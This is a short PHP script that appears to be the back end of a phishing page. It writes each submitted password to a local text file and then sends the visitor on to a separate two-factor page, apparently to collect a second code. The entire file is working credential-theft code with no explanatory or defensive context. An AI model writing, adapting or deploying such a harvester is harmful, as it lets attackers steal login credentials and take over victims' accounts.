<?php

file_put_contents("usernames.txt",  " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: 2fa-page.html');
exit();
?>